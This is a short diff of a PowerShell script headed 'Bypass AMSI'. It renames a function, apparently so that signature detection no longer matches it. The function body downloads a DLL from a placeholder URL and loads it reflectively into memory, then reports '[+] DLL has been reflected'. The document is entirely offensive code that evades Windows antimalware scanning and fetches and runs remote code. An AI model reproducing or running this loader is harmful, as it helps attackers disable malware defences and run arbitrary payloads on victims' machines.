@@ -1,6 +1,6 @@
 # Bypass AMSI
 
-function BYPASS-AMSI
+function BYPASSER
 {
 
 ([AppDomain]::CurrentDomain.Load((New-Object net.webclient).DownloadData('LINK-TO-YOUR-DLL')))
@@ -8,4 +8,4 @@ function BYPASS-AMSI
 echo "[+] DLL has been reflected"
 
 }
-BYPASS-AMSI 
+BYPASSER
